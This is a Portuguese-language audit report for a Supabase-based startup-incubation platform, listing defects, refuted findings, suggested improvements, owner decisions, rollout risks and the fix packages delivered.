| FES-16 | Pesquisa: cada pausa de 300 ms acrescenta uma entrada ao histórico do browser | P12 |
| FEX-02 | Rascunho do modelo de investidor partilhado entre contas e rascunhos/estado por utilizador não limpos no logout | P3, O1 |
| FEX-07 | i18n-lint falha: 8 chaves em falta em PendingApprovalsManager (confirmado) e CI vermelho | P13, O1 |
| FEX-08 | en.json contém 116 textos em português (ou misturados) que nenhum gate deteta | O1 |
| FEX-09 | Contagens do shell fabricam 0 quando a consulta falha (badge de atenção e badges do backoffice) | P1, P3 |
| FEX-10 | Centro de notificações: badge limitado a 50 linhas (hook de contagem exata sem uso), sem estado de erro, rótulos fixos e botão apagar invisível ao teclado | P1 |
| FEX-11 | TopBar mostra 'Membro da Equipa' para o papel backoffice | P1 |
| FEX-12 | Chunk de entrada de 1,12 MB: CommandPalette importa react-markdown estaticamente; orçamento size-limit de 900 KB gzip nunca dispara | P13 |
| FEX-13 | URL completo (com tokens) gravado em client_error_logs e bug_reports | P1 |
| FEX-14 | sanitizeUrl aceita URLs protocolo-relativas (//host) como caminhos internos | P1, P13 |
| FEX-15 | Rótulos acessíveis fixos em inglês/português e incorretos em componentes partilhados | P1, P2 |
| FEX-16 | Mudar de idioma mostra chaves cruas até o bundle terminar de descarregar | P1, P8, P9 |
| FEX-17 | Datas e números sem locale (40 usos de toLocaleDateString()/toLocaleString() sem argumento) | P3, P12, P13, P14 |
| FEX-18 | Âncoras (#fragmento) nunca fazem scroll: ScrollToTop força o topo e a página renderiza depois | P7 |
| FEX-19 | AcceptInvite repete o processamento do convite quando o objeto user muda de identidade | P7 |
| FEX-20 | Tema guardado só é aplicado depois do bundle de idioma: flash claro para quem usa tema escuro | O1 |
| FEX-21 | Testes de auth/segurança da fatia são tautológicos; sem testes para sessionReset, sanitizeUrl, logError, lazyWithRetry, queryClient, ProtectedRoute | O1 |
| HRD-08 | Roteador do importador de dados monta o importador antigo enquanto as flags carregam ou se a 1.ª leitura falha | P9 |
| HRD-09 | Exportações CSV que ainda não usam o serializador que neutraliza fórmulas | P5, P14 |
| HRD-10 | Logger das edge functions perde o contexto em 13 chamadas log.error(msg, {…}) | O2 |
| HRD-11 | client_error_logs guarda o URL completo das páginas públicas, incluindo tokens de capacidade | P1 |
| HRD-13 | send-session-invite recusa o lote inteiro se um destinatário não está nos contactos registados, e o cliente esconde o erro | O2 |
| HRD-14 | Defeitos nas suites de teste: sintaxe em pulse_notifications_kill_switch e e2e XLSM que falha em vez de saltar | P15 |
| HRD-15 | send-message-email-alert envia conteúdo da mensagem a participantes suspensos/pendentes | P2 |
| ONB-07 | claim_startup devolve 'auto_claimed' sem efeito com adesão antiga inativa e só reclama um workspace por startup | P5 |
| ONB-08 | accept_workspace_invitation devolve sucesso sem reativar uma adesão inativa nem promover team_member a founder | P5 |
| ONB-09 | Aceitar um convite abre sempre o assistente de onboarding, mesmo num workspace em curso (KPIs e marcos duplicados) | P7 |
| ONB-10 | Login mostra 'Email not confirmed' em inglês e não há forma de reenviar o email de verificação | P7 |
| ONB-11 | As políticas de workspace_invitations leem auth.users e falham para qualquer utilizador autenticado | P5 |
| OPS-05 | Teste pgTAP do kill-switch de pulsos tem erro de sintaxe (INSERT metido a meio de outro): só 3 de 11 verificações correm | P15 |
| OPS-07 | Harness pgTAP local: falha 387 migrações em PostgreSQL 16 (SET transaction_timeout) e aborta com exit 141 a meio das suites | O3 |
| OPS-08 | i18n-lint e i18n-sync-guard falham: 4 chaves admin.* usadas em PendingApprovalsManager não existem nos catálogos | P13, O1 |
| OPS-09 | withCronRunLogging grava uma linha em cron_job_runs por cada pedido anónimo (verify_jwt=false) com um x-cron-token qualquer | P10 |
| OPS-10 | A página de diagnóstico (AppDiagnostics) escreve em dados reais: UPDATE de contratos, workspaces e leads, e polui contract_field_conflicts | P13 |
| OPS-11 | Cópia de segurança de produto: paginação sem ORDER BY, sem retenção e cobertura parcial | O2 |
| OPS-12 | Registos de operação crescem sem limite (cron_job_runs, system_alerts, client_error_logs, cron.job_run_details) | P6, O3 |
| OPS-13 | cron_invoke_edge tem o URL do projeto de produção fixo: um staging chamaria produção | O1 |
| OPS-14 | Documentos de operação desatualizados ou errados (GO-LIVE de março, manifesto com 68 desvios, staging-runbook com script inexistente, .env.example incompleto) | O3 |
| OPS-15 | supabase/tests/portfolio_archived_actions.regression.sql não é um teste pgTAP e depende de dados que não cria | P15 |
| RV-04 | Botão de arranque do importador em massa mostra '{{done}} / {{total}}' à letra | P5 |
| RV-05 | Import /cors das edge functions sem mapeamento fica fora da versão fixada | P15 |
| RV-06 | Aviso com 0 emails enviados mostra 'emails entregues a todos os membros' | P13 |
| RV-07 | generate-contract-pdf tenta reescrever campos congelados de um contrato partially_signed (UPDATE falha só no log, PDFs órfãos) | P7 |
| RV-08 | rc10_part3.test.sql aborta inteiro na base com o drizzle (contrato 'active' sem assinatura) | P15 |
| SCH-09 | generate-financial-prefill pede workspaces.name/sector/program_type: fase e nome ignorados nas propostas | O2 |
| SCH-10 | send-notification-email lê documents.title: o nome do documento vai sempre como 'documento' | O2 |
| SCH-11 | generate-first-contact-brief: funnel_items.phone e communication_log.kind/summary não existem (sempre 404) | O2 |
| SCH-12 | commit-hubspot-history-import: 1º critério de correspondência (external_entity_refs) nunca funciona | P9 |
| SCH-13 | sync-graph-email-history: upsert com onConflict em índice parcial falha sempre fora do dry-run | P1, O2 |
| SCH-14 | run-workflow-rules: insert em staff_tasks sem assignee_id (NOT NULL) | O2 |
| SCH-15 | useNotifications subscreve realtime numa tabela fora da publicação: o sino não atualiza | P1 |
| SCH-16 | Seis buckets usados pelo código só existem por políticas, sem criação em migração | O3 |
| SCH-17 | Fallbacks de URL da aplicação inconsistentes entre edge functions (3 domínios) | P10, O2 |
| SIGN-06 | Emails «contrato assinado/ativado» nunca saem para startups novas (workspace criado na assinatura) nem na assinatura nativa | P8 |
| SIGN-07 | O founder criado na assinatura recebe dois emails: o de acesso e um «contrato ativo, entre com a sua conta habitual» | P8 |
| SIGN-08 | DocuSign: eventos sem mapeamento gravam o texto cru em startup_contracts.signature_status | P8 |
| SIGN-09 | regulation_version: o Regulamento aceite é gravado como 'V11_2026' e logo reescrito como 'V11-REG-2026' | P8 |
| SIGN-10 | Upload de documento com metadados por gravar (HTTP 207) é mostrado ao founder como carregado | P8 |
| SIGN-11 | Arquivo SharePoint: contratos presos em archive_status='uploading' nunca voltam à fila | P10 |
| SIGN-12 | staff-assign-workspace-to-contract: guarda de program_id repetida três vezes (C13 aplicado 3 vezes) | O1 |

## 8. O que a base viva já corrige, e o que foi refutado

Estes achados da primeira ronda **não entram nos prompts**. Aplicar as migrações que tinham proposto seria inútil ou prejudicial.

| ID | Porquê |
|---|---|
| E2E-02 Trigger sync_contract_signature_downstream põe o intake em… | A parte central do achado (o trigger põe o intake em 'activated' no instante da assinatura) já está corrigida pelo drizzle. drizzle/migrations/0010_verified_signature_downstream_and_recovery_wakeup.sql redefine sync_contract_signature_downstream: só põe o intake em 'signed' (nunca 'activated') e exclui 'cancelled' e 'rejected' (NOT IN ('signed','activated','cancelled','rejected')), portanto também não reabre… |
| E2E-12 apply_contract_signature_atomic aceita nova assinatura (outro… | Já não se reproduz na base viva. O drizzle 0007 criou o trigger guard_contract_integrity (confirmado na definição final na réplica viva), que lança `signature_timestamp_immutable` (42501) quando um UPDATE altera signed_at de um contrato que já o tinha. A segunda chamada de apply_contract_signature_atomic com outro signer_email num contrato 'completed' tenta pôr signed_at = now() e falha nesse trigger. A função é… |
| ED1-01 check-contract-anniversaries: o CHECK de contract_reminders recusa… | A causa principal já está corrigida pelo drizzle/migrations/0005_rc11_d10_contract_reminders_types.sql: o CHECK contract_reminders_reminder_type_check aceita agora 'post_incubation_transition' e os padrões ^anniversary_[0-9]+y$, ^biennial_review_[0-9]+y$ e ^renewal_notice_AAAA-MM-DD$. Na viva os 4 tipos usados pela edge function gravam, o SELECT de deduplicação passa a encontrá-los e deixa de haver repetição diária… |
| FEF-03 Estatísticas operacionais (contagem de ações atrasadas e pendentes,… | A parte SQL já está corrigida na base viva: drizzle/migrations/0018_exclude_archived_milestone_actions_from_stats.sql (linhas 10-19) acrescentou `AND (ai.milestone_id IS NULL OR EXISTS (SELECT 1 FROM milestones m WHERE m.id=ai.milestone_id AND m.archived_at IS NULL))` a get_workspace_stats e ao filtro _overdue_actions de search_workspaces_paged. Pior: a migração proposta (secção 2 de migration_rc12_fe_founder.sql)… |
| HRD-12 Recuperar o endurecimento do AGENTS.md que não existe em nenhuma… | A base viva já tem tudo o que o achado pedia. As 4 suites audit_* passam 100% na viva sem qualquer migração nova: audit_private_lookup_helpers 8/8, audit_template_visibility 6/6, audit_five_blocking_reads 10/10, audit_workspace_mutations 9/9 (na ronda antiga: 4/8, 4/6, 0/10, 5/9). O drizzle corrige: 0007 (políticas financial_cell_map/financial_model_metric_map/quality_checks_config com is_staff(), REVOKE a anon em… |
| OPS-03 reconcile-contract-activation (recuperação de ativações de contratos… | O achado cai: a premissa 'nenhum cron para reconcile-contract-activation' só era verdade na réplica sem o drizzle. drizzle/migrations/0010 cria wake_contract_activation_recovery (AFTER UPDATE em startup_contracts): quando activation_sync_pending passa a true faz cron.schedule('reconcile-contract-activation','*/5 * * * *','SELECT public.dispatch_contract_activation_recovery()') e chama logo cron_invoke_edge;… |
| SIGN-05 O trigger do contrato marca o intake como 'activated' e a lead como… | O achado era a mesma causa de E2E-02 e já está corrigido no drizzle. Na réplica viva, o s1 da rota nativa (sem workspace) dá after_apply = pending_signature/completed/workspace vazio/intake=signed/crm=contracted (na réplica antiga dava intake=activated). A função viva (drizzle 0010) não põe 'activated' e exclui 'cancelled'; guard_intake_activation impede 'activated' sem workspace ativo e desbloqueado. ATENÇÃO: a… |

Itens mudados, não removidos: **ONB-01** (só o claim; o "assign" já foi corrigido pelo drizzle 0016), **ONB-02** (reescrito: `has_role` consulta `profiles` diretamente porque o drizzle 0013 fez `account_not_suspended` devolver `false` sem JWT, o que anularia admins ativos em cron e triggers), **ONB-05**, **HRD-12/ONB-08/HRD-06** (fundidos), **FEF-03** (só sobra o cliente), **DBP-04** (reduzido às 8 tabelas mais quentes e alinhado com o `can_write_workspace` final).

## 9. RC9 e RC10: o que ficou por aplicar

- **RC10:** B9 (avisos) está todo aplicado. O C9 do servidor está aplicado em `public-contract-onboarding` (o meu brief estava errado). Mal aplicados: **CRM-05** (C12 aplicou escape HTML também a assuntos e títulos), **SIGN-04** e **E2E-11** (A3: "Repor e reenviar" mantém `regulation_accepted_at`; `submit_signing` regista o Regulamento sem confirmação do founder), **ONB-05** (atribuir workspace apaga `needs_onboarding`). Estão nas Partes indicadas nas tabelas.
- **RC9 Parte 5:** P5.2, P5.4 e P5.6 a P5.10 aplicados; P5.1 e P5.3 em parte; P5.5 quase todo. O que ainda mantém o CI vermelho: 4 chaves i18n do `PendingApprovalsManager`, erro de sintaxe no teste pgTAP do kill-switch dos pulses, e as suites `audit_*` que precisam do drizzle. Tudo resolvido nos blocos de CI e testes (Parte 15, Opcional 3) e no Anexo R.

## 10. Melhorias finais sugeridas

Não são defeitos: são o que eu faria a seguir, por valor/esforço. As que dependem de si estão marcadas **[decisão]**. Nenhuma está nos prompts RC12; cada uma dá um prompt curto próprio (RC13).

| # | Melhoria | Porquê | Esforço | |
|---|---|---|---|---|
| 1 | Alertas que alguém lê: email diário (e imediato para `critical`) com `system_alerts` aos admins; dedupe por dia e estado "resolvido" | Hoje os 24 monitores escrevem em `system_alerts` e o RC12 passa a gerar uma notificação, mas ninguém recebe email. É o que separa "tem monitorização" de "alguém é avisado". | 4 h | [decisão] destinatários |
| 2 | Ping externo "dead-man switch" (Healthchecks/UptimeRobot) para `check_automation_health` e `/login` | Se a base ou o cron morrerem, nada dentro da app consegue avisar. | 1,5 h | [decisão] serviço |
| 3 | Verificar as respostas HTTP dos jobs edge (`net._http_response`) e alertar em 4xx/5xx/timeout | O `pg_cron` regista que invocou, não que a função respondeu bem. | 3 h |  |
| 4 | Gate no servidor: não enviar o contrato para assinatura enquanto o intake ligado não estiver aprovado; exigir programa antes de criar contrato | Fecha a classe de contratos sem programa ou sem intake, que obrigou a recuperações manuais. | 4,5 h | [decisão] regra do botão "Criar contrato e enviar" |
| 5 | Botão "Enviar acesso ao founder" na triagem "Convidar founder" (reaproveita `send-workspace-invite`) | Hoje a triagem só se fecha sozinha; o staff não tem ação. | 2,5 h |  |
| 6 | Round-robin de consultores atómico no banco (`pick_round_robin_consultant`) e worker (ou remover a promessa de retry) para `first_contact_outbox` | Duas marcações em simultâneo escolhem o mesmo consultor; o convite do calendário falhado nunca é reenviado. | 5,5 h | [decisão] worker |
| 7 | Revogar sessão e refresh token de contas suspensas via GoTrue admin | O RC12 bloqueia por RLS, `has_role` e `isAccountActive`, mas o token continua válido. | 3 h |  |
| 8 | Restringir `has_accepted_nda(uuid)` ao próprio ou ao staff; fechar `health_notes`/`priority_notes` por coluna ou RPC | Hoje qualquer autenticado pergunta o NDA de outro; founders leem notas internas por API. | 4,5 h | [decisão] modelo de dados |
| 9 | Auto-claim no primeiro login quando o email confirmado coincide com uma startup importada; avisar o founder quando a candidatura é rejeitada | Menos trabalho manual de aprovação e menos founders perdidos. | 5 h | [decisão] política de aprovação |
| 10 | Impor "registo só por convite" também no servidor (hook `before-user-created` ou trigger) | Hoje só o cliente impede o auto-registo. | 4 h | [decisão] |
| 11 | Procurar conta existente por email em SQL (em vez de paginar `listUsers`, que falha acima de 4000 utilizadores) | `autoCreateFounderAccount` deixa de encontrar contas existentes. | 1,5 h |  |
| 12 | Deduplicar marcos e KPIs no assistente de onboarding; torná-lo atómico | Aceitar um convite num workspace em curso duplica marcos. | 3 h |  |
| 13 | Decidir o futuro de `drizzle/migrations`: o Lovable continua a gravar lá? Passar a paridade `types.ts` e espelho drizzle para o CI (já em Anexo R) | Sem isto o desvio volta a acumular-se. | 1 h | [decisão] com o Lovable |
| 14 | PG17 fixo no harness e no CI; `[db] major_version = 17` | O baseline só reproduz em PG17. | 1 h |  |
| 15 | Staging separado com segredos de teste + E2E semanal; PITR e ensaio trimestral de restauro; retenção de backups (30 diários + 12 mensais) | Hoje não há ambiente onde falhar com segurança nem prova de restauro. | 14 h | [decisão] custo |
| 16 | Painel único "Estado da plataforma" (saúde, alertas, integrações, diagnósticos) | Junta o que está espalhado por 5 ecrãs. | 6 h |  |
| 17 | Unificar `PUBLIC_APP_URL`/`APP_URL`/`SITE_URL` num helper `_shared/appUrl.ts`; `requireActiveStaff(req)` partilhado em `security.ts` | Há 3 domínios de fallback e 17+ funções a repetir a mesma guarda. | 6 h |  |
| 18 | Dividir os chunks pesados (`MyWorkspaces`, Backoffice) e apertar o `size-limit` de 900 KB para cerca de 320 KB | O chunk de entrada tem 1,12 MB e o orçamento nunca dispara. | 2,5 h |  |
| 19 | Escrever contratos pela RPC `apply_contract_patch` em vez de UPDATE direto | Mais auditoria e menos linhas "unattributed" em `contract_field_conflicts`. | 6 h | [decisão] toca na assinatura |

## 11. Decisões que são suas

Ficaram implementadas com o comportamento mais conservador; confirme ou diga para mudar.

| Tema | O que ficou feito e o que falta decidir |
|---|---|
| Validade e renovação do NDA do mentor | O `check-mentor-nda-expiry` avisava de uma expiração (365 dias) que não existe nas regras do produto. Passa a ficar desligado por omissão atrás do segredo `NDA_EXPIRY_WARNINGS_ENABLED` até haver regra. É um pendente do `roadmap.md`. |
| Semântica da "Nota rápida" do mentor | Assumi: visível ao staff e ao próprio autor, nunca ao founder (SCH-03/FES-04). |
| Contratos importados em massa | Para o contrato "ativo" passar o trigger `guard_contract_integrity`, o importador exige `signed_at` e marca `signature_status=completed`; isto ativa `activation_sync_pending` e o reconciliador tenta ativar workspaces `imported_unclaimed`. A alternativa é importar como `pending_signature` ou `draft`. |
| PHC e HubSpot | Clientes PHC entram como "contracted" sem workspace; reimportar do HubSpot pode recuar a fase de leads avançadas. Decida a regra "só avançar". |
| Rotas órfãs | `/staff/impact` e `/workspace/:id/value-prop` não têm ligação. Ligar ou retirar. |
| Tabela de backup `template_instances_dedup_backup_20260516` | Contém dados de founders. O `DROP` fica fora dos prompts até confirmar que a deduplicação de 16 maio está boa. |
| Código sem chamador | `export-cohort-health-pdf` e `commit-hubspot-import` não têm chamador na UI. Apagar ou manter. |
| `board-pack`: o que conta como startup ativa | Aqui só se excluem `archived` e `rejected`; `pending`, `claimed` e `imported_unclaimed` contam. |
| Atribuir um consultor a um workspace deve conceder o papel global? | A lente de backoffice pede-lhe para decidir. O trigger `trg_sync_assigned_consultor_to_members` já o adiciona como membro. Mudar a regra sem migrar dados tira acesso a quem já o tem. |
| Pendentes do `roadmap.md` que dependem de si | Preços canónicos, mailbox dedicada para testes Graph, titularidade da revogação do Data Room, papel "mentorado NDA", confirmação de email hospedada, teste de volume do portefólio e das notificações em base descartável. |

## 12. Riscos a ter em conta ao aplicar

- **ONB-02** cria uma política `RESTRICTIVE` em cerca de 204 tabelas na mesma transação (ACCESS EXCLUSIVE por tabela). Aplicar com pouco tráfego; já houve um deadlock em teste com tráfego concorrente. Se falhar, repetir. **Tabelas criadas depois** precisam do mesmo bloco `DO`: acrescente isso às regras do projeto.
- **Guardas md5.** Cada `CREATE OR REPLACE FUNCTION` começa por um guarda que aborta se a função real divergiu. É de propósito. Se abortar, devolva o `md5` e o `pg_get_functiondef` e eu ajusto; não force.
- **`CREATE INDEX` sem `CONCURRENTLY`** (o Lovable corre migrações numa transação): bloqueia escritas durante a criação; não medi o tempo em tabelas grandes.
- **Retenção de logs:** a purga diária (03:47 UTC, 50 000 linhas por tabela e por dia) remove também chaves de deduplicação de webhooks com mais de 180 dias. Confirme a política da empresa.
- **Foreign keys** `NOT VALID` em `mentor_connections.workspace_id` e `sessions.session_template_id` ficam por validar até limpar órfãos em produção.
- **Fica por provar** (sem rede nem browser): chamadas reais ao DocuSign, PandaDoc, Resend, Microsoft Graph e GoTrue; execução de `javascript:` em browser; comportamento multi-separador do timeout de sessão; o `pg_cron` real e o tempo de `CREATE INDEX` em produção; se o DocuSign honra `X-DocuSign-Idempotency-Key`; se `google/gemini-3-flash-preview` aceita PDF inline.

## 13. Limites desta auditoria

- A réplica viva é uma **reconstrução**: supabase + as migrações do drizzle + 2 tabelas e 1 função só-produção reconstruídas a partir de `types.ts` (sem constraints, índices ou defaults reais). Não consultei a produção.
- Dados reais não foram lidos. As 97 consultas de `LOVABLE-RC12-DADOS-AFETADOS.sql` dizem-lhe quantos registos já foram afetados.
- `workspace_readiness_status.is_complete` (repositório) contra `status` (produção) e `get_kpi_percentiles` por recuperar.
- As lentes não leram todos os 108 handlers ponta a ponta: foram lidas as 32 edge functions de maior risco (4 lotes) mais as de contratos, CRM, onboarding e importações.

## 14. Ficheiros entregues

| Ficheiro | Para quê |
|---|---|
| `LOVABLE-RC12-AUDIT.md` | Este relatório |
| `LOVABLE-RC12-FIXES-ESSENCIAL.md` | 15 partes, 715 KB, HIGH + MED; colar no Lovable uma de cada vez |
| `LOVABLE-RC12-FIXES-OPCIONAL.md` | 3 partes, 121 KB, LOW |
| `LOVABLE-RC12-PARTES.zip` | As mesmas partes, uma por ficheiro (`RC12-P01.md` a `RC12-P14.md`, `RC12-OPC01.md` a `RC12-OPC03.md`, anexos R e T e o patch i18n), para copiar sem navegar num ficheiro de 700 KB |
| `LOVABLE-RC12-ANEXO-RECUPERACAO.md` | Anexo R: DDL do drizzle de volta ao repositório (aplicar antes da Parte 1, se o for aplicar) |
| `LOVABLE-RC12-ANEXO-TESTES.md` | Anexo T: testes novos e documentos |
| `LOVABLE-RC12-I18N-PATCH.json` | 140 chaves novas em pt e en, 121 textos atualizados em en (os que estavam em português) e 1 em pt; aplicar uma vez, no início da Parte 1 |
| `LOVABLE-RC12-DADOS-AFETADOS.sql` | 97 consultas só de leitura, por achado |
| `LOVABLE-RC12-DRIFT-CHECKS.sql` | Histórico de migrações e extração do DDL só-produção (só leitura) |

### Mapa das partes do pacote essencial

| Parte | KB | Conteúdo |
|---|---|---|
| 1 | 48 | HIGH/MED/LOW: ONB-02, FEB-01, FEX-01, FES-08, DBP-01, DBP-02, SCH-01, DBP-03, SCH-13, HRD-05, FEX-09, FEX-14, FEX-10, SCH-15, FEX-16, FEX-13, HRD-11, FEX-15, FES-03, FEX-11, CRM-13 |
| 2 | 26 | MED: HRD-02, ED4-09, ED1-03, HRD-15, HRD-07, ED3-12, ED3-13, ED3-14, FES-15, FES-14, FEX-15 |
| 3 | 49 | HIGH/MED/LOW: FEB-02, FEB-06, HRD-05, FEX-09, FEB-10, FEB-16, FEB-01, FEX-01, FEX-17, FEX-02 |
| 4 | 50 | HIGH/MED/LOW: FEF-07, FEB-01, FEX-01, FES-08, FEF-09, FEF-02, SCH-06, FES-05, FEB-07, FEB-13, FEB-14 |
| 5 | 51 | HIGH/MED: ED3-01, ED3-02, ED3-03, RV-01, HRD-09, RV-04, FEB-01, FEX-01, ONB-01, ONB-05, ONB-04, ONB-06, ONB-07, HRD-06, ONB-08, ED2-15, ONB-11, E2E-05, ED3-05, SCH-03, FES-04 |
| 6 | 50 | MED: OPS-04, E2E-04, SCH-02, OPS-02, OPS-01, DBP-07, OPS-12, DBP-05, DBP-06, DBP-08, FEX-05, HRD-01, FEX-03, DBP-02, SCH-01 |
| 7 | 43 | MED/LOW: FEF-05, FEX-06, ONB-10, FEX-19, ONB-09, FEX-18, SIGN-02, HRD-03, ED2-01, SIGN-04, ED2-02, SIGN-03, ED2-03, ED2-04, E2E-06, RV-02, E2E-07, RV-07 |
| 8 | 55 | MED: E2E-01, E2E-03, SIGN-07, E2E-09, E2E-10, E2E-08, SIGN-06, SIGN-08, FEX-05, SIGN-01, E2E-11, SIGN-09, SIGN-10, CRM-02, CRM-03, CRM-04, CRM-05, FEX-16, ED4-05, ED4-06 |
| 9 | 52 | MED/LOW: SIGN-01, CRM-10, FEX-16, CRM-11, CRM-07, ED4-13, ED1-04, ED1-03, ED4-09, ED4-16, ONB-03, ED4-07, SCH-12, HRD-08, SCH-05, ED4-12, HRD-02 |
| 10 | 52 | MED: ED1-02, ED1-03, ED1-06, SCH-17, ED4-01, ED4-02, ED4-03, HRD-04, SCH-04, ED4-14, ED4-15, ED4-08, ED3-11, OPS-09, ED1-05, SIGN-11, ED1-07, FEX-05, ED4-04, SCH-02, OPS-02 |
| 11 | 54 | MED: ED1-03, ED4-09, ED1-11, ED2-09, ED3-06, ED2-05, ED2-06, ED2-07, ED2-08, ED3-04, ED3-05, ED3-07, ED3-08, ED3-09, ED3-10, SCH-08, ED4-10 |
| 12 | 51 | MED/LOW: FEF-04, DBP-02, FEF-03, FEX-17, FEF-05, FES-07, FES-04, SCH-03, FES-05, SCH-07, FES-06, FEB-02, FES-11, FES-10, FES-01, FEX-04, FES-02, FES-16 |
| 13 | 49 | MED/LOW: FES-03, FEX-12, FEX-14, FES-11, FEF-01, FEF-10, FES-12, FEX-17, FES-13, FES-14, OPS-02, SCH-02, OPS-01, FEB-11, OPS-10, FEB-12, FEB-13, FEB-14, FEB-15, FEB-08, FEF-08, FES-09, FEX-07, OPS-08, FEB-16, RV-06 |
| 14 | 54 | MED/LOW: FEX-17, CRM-12, CRM-01, HRD-05, FEB-02, FEB-03, FEB-04, HRD-09, FEB-05, FEX-05 |
| 15 | 23 | MED: DRF-05, OPS-05, RV-03, HRD-14, OPS-15, RV-08, OPS-06, RV-05 |

- **Opcional 1** (52 KB): FEF-11, E2E-05, ED3-05, SCH-03, FEB-01, FES-08, DBP-04, CRM-08, DBP-10, DBP-11, DBP-12, OPS-13, FEX-02, FEX-20, FES-09, FEX-07, OPS-08, FEF-06, FEX-08, FEB-09, FEX-21, E2E-13, SIGN-12, CRM-09, ED1-10, ED2-13, ED2-14, ED2-15
- **Opcional 2** (55 KB): ED2-10, ED2-11, ED2-12, ED1-08, SCH-17, HRD-10, ED4-11, ED1-11, HRD-13, CRM-06, SCH-10, SCH-11, SCH-13, DBP-03, SCH-14, OPS-11, ED1-09, ED2-09, SCH-09, ED3-15, ED2-06
- **Opcional 3** (14 KB): SCH-16, DBP-07, OPS-12, OPS-14, DRF-03, OPS-07

